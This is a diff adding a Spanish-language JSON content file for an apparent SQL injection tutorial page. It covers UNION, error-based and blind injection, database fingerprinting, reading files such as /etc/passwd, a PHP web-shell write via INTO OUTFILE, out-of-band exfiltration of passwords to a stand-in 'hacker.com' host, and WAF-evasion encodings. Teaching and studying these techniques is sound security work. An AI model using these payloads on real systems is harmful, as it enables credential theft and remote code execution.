@@ -1,0 +1,223 @@
+{
+    "header": {
+        "title": "SQL Injection Masterclass",
+        "description": "Dominando la vulnerabilidad más crítica de la web. Desde inyecciones básicas hasta técnicas ciegas avanzadas y evasión de WAF."
+    },
+    "quote": {
+        "text": "La mayoría de las vulnerabilidades que vemos hoy son simplemente variaciones de los mismos viejos problemas, como la inyección SQL, que conocemos desde hace décadas.",
+        "author": "Jeremiah Grossman"
+    },
+    "tabs": [
+        {
+            "id": "sqli-types",
+            "label": "Tipos fundamentales"
+        },
+        {
+            "id": "sqli-fingerprint",
+            "label": "Identificación BD"
+        },
+        {
+            "id": "sqli-arithmetic",
+            "label": "Aritmética y lógica"
+        },
+        {
+            "id": "sqli-files",
+            "label": "Archivos (RFD)"
+        },
+        {
+            "id": "sqli-advanced",
+            "label": "Avanzado (OOB/2nd Order)"
+        },
+        {
+            "id": "sqli-waf",
+            "label": "Evasión de WAF"
+        }
+    ],
+    "content": {
+        "sqli-types": {
+            "title": "Fundamentos de inyección",
+            "icon": "Layers",
+            "sections": [
+                {
+                    "title": "In-Band (UNION Based)",
+                    "description": "La más rápida. Los datos robados aparecen directamente en la pantalla de la aplicación.",
+                    "code": "http://web.com?id=1 UNION SELECT username, password FROM users--",
+                    "variant": "success"
+                },
+                {
+                    "title": "Error-Based",
+                    "description": "Se fuerza un error de sintaxis o conversión que 'escupe' los datos internos en el mensaje de error.",
+                    "code": "... CAST((SELECT password FROM users LIMIT 1) AS int) ...",
+                    "errorMsg": "Error: Conversion failed when converting the varchar value 'P@ssw0rd123' to data type int.",
+                    "variant": "warning"
+                },
+                {
+                    "title": "Blind (ciega)",
+                    "description": "No hay salida visual. Se infiere información bit a bit.",
+                    "variant": "error",
+                    "subTypes": [
+                        {
+                            "label": "Booleana",
+                            "text": "Si la página carga normal, la condición es TRUE.",
+                            "code": "id=1 AND (SELECT substring(pass,1,1))='a'"
+                        },
+                        {
+                            "label": "Time-Based",
+                            "text": "Si la página tarda 10 segundos, la condición es TRUE.",
+                            "code": "id=1'; IF (1=1) WAITFOR DELAY '0:0:10'--"
+                        }
+                    ]
+                }
+            ]
+        },
+        "sqli-fingerprint": {
+            "title": "Identificación de base de datos",
+            "icon": "Fingerprint",
+            "description": "Para atacar con éxito, primero hay que saber qué motor estamos atacando. Cada uno habla un 'dialecto' SQL distinto.",
+            "columns": [
+                "Prueba",
+                "Oracle",
+                "Microsoft SQL",
+                "MySQL"
+            ],
+            "rows": [
+                {
+                    "test": "Versión",
+                    "oracle": "SELECT banner FROM v$version",
+                    "mssql": "SELECT @@version",
+                    "mysql": "SELECT version()"
+                },
+                {
+                    "test": "Concatenación",
+                    "oracle": "'a'||'b'",
+                    "mssql": "'a'+'b'",
+                    "mysql": "CONCAT('a','b')"
+                },
+                {
+                    "test": "Tablas del sistema",
+                    "oracle": "all_tables",
+                    "mssql": "sysobjects",
+                    "mysql": "information_schema"
+                }
+            ]
+        },
+        "sqli-arithmetic": {
+            "title": "Inyección aritmética ciega",
+            "icon": "Calculator",
+            "description": "Cuando los operadores lógicos (AND/OR) están filtrados o causan errores de sintaxis complejos, usamos matemáticas para inferir datos.",
+            "cards": [
+                {
+                    "title": "División por cero",
+                    "description": "Si la condición es cierta, provocamos un error matemático.",
+                    "code": "id = 3 - (0 / (SELECT ...condición...))",
+                    "list": [
+                        "• Si condición devuelve 0 (FALSE) → 3 - (0/0) → ERROR",
+                        "• Si condición devuelve 1 (TRUE) → 3 - (0/1) → 3 → OK"
+                    ]
+                },
+                {
+                    "title": "Desbordamiento (Overflow)",
+                    "description": "Provocar error excediendo la capacidad numérica.",
+                    "code": "... * 99999999999999999999 ..."
+                },
+                {
+                    "title": "Operaciones bit a bit",
+                    "description": "Shift para extraer bits individuales.",
+                    "code": "id = 1 | (SELECT ascii(user) & 1)"
+                }
+            ],
+            "functions": {
+                "title": "Funciones matemáticas útiles para ofuscación",
+                "items": [
+                    "FLOOR()",
+                    "CEIL()",
+                    "POWER()",
+                    "SQRT()",
+                    "ABS()",
+                    "MOD()"
+                ]
+            }
+        },
+        "sqli-files": {
+            "title": "Descarga remota de archivos (RFD)",
+            "icon": "FileWarning",
+            "description": "Abuso de privilegios de base de datos para leer archivos sensibles del sistema operativo (/etc/passwd, boot.ini).",
+            "cards": [
+                {
+                    "title": "Microsoft SQL Server (OLE DB)",
+                    "code": "SELECT * FROM OpenRowSet('MSDASQL', 'Driver={Microsoft Text Driver (*.txt)};DefaultDir=C:\\;', 'select * from password.txt')",
+                    "footer": "Requiere configuración DisallowAd-hocAccess = 0.",
+                    "borderColor": "primary"
+                },
+                {
+                    "title": "MySQL (Load File)",
+                    "code": "SELECT Load_File('/etc/passwd')",
+                    "footer": "Alternativa: LOAD DATA INFILE para volcar contenido a una tabla temporal y luego leerla.",
+                    "borderColor": "success"
+                },
+                {
+                    "title": "Escritura (RCE via Web Shell) - Técnica adicional",
+                    "code": "UNION SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE '/var/www/html/shell.php'--",
+                    "footer": "Escribe un archivo malicioso en el directorio web para ganar ejecución remota de comandos.",
+                    "borderColor": "error"
+                }
+            ]
+        },
+        "sqli-advanced": {
+            "title": "Técnicas avanzadas",
+            "icon": "Skull",
+            "sections": [
+                {
+                    "type": "oob",
+                    "title": "Out-of-Band (OOB)",
+                    "description": "Cuando la inyección es ciega total y el tiempo es inestable. Forzamos al servidor DB a conectarse a nosotros (DNS/HTTP).",
+                    "badge": "Crítico",
+                    "examples": [
+                        {
+                            "label": "-- Oracle (HTTP)",
+                            "code": "SELECT UTL_HTTP.REQUEST('http://hacker.com/'||pass)\nFROM users;"
+                        },
+                        {
+                            "label": "-- MSSQL (DNS/SMB)",
+                            "code": "xp_dirtree '\\\\hacker.com\\share'"
+                        }
+                    ]
+                },
+                {
+                    "type": "second-order",
+                    "title": "Second-Order SQLi",
+                    "text": "El ataque durmiente. Inyectamos el payload al crear un usuario (ej. admin' --). No pasa nada. El ataque se detona días después, cuando un administrador revisa ese usuario y la aplicación usa el nombre almacenado en otra consulta insegura."
+                }
+            ]
+        },
+        "sqli-waf": {
+            "title": "Evasión de WAF",
+            "icon": "ShieldAlert",
+            "cards": [
+                {
+                    "title": "HPP (Parameter pollution)",
+                    "description": "Enviar el mismo parámetro dos veces. WAF lee uno, backend lee otro.",
+                    "code": "id=1&id=UNION SELECT..."
+                },
+                {
+                    "title": "Ofuscación de espacios",
+                    "description": "Reemplazar espacios por comentarios o saltos de línea.",
+                    "code": "SELECT/**/user/**/FROM/**/users"
+                },
+                {
+                    "title": "Fragmentación JSON",
+                    "description": "Dividir payloads en estructuras JSON anidadas que el WAF no procesa."
+                },
+                {
+                    "title": "Codificación rara",
+                    "description": "Uso de IBM EBCDIC o UTF-7 si la base de datos lo soporta."
+                },
+                {
+                    "title": "Whitespace bypassing (%0A)",
+                    "description": "Usar saltos de línea (Line Feed) o tabuladores en lugar de espacios bloqueados.",
+                    "code": "UNION%0ASELECT%0A..."
+                }
+            ]
+        }
+    }
+}
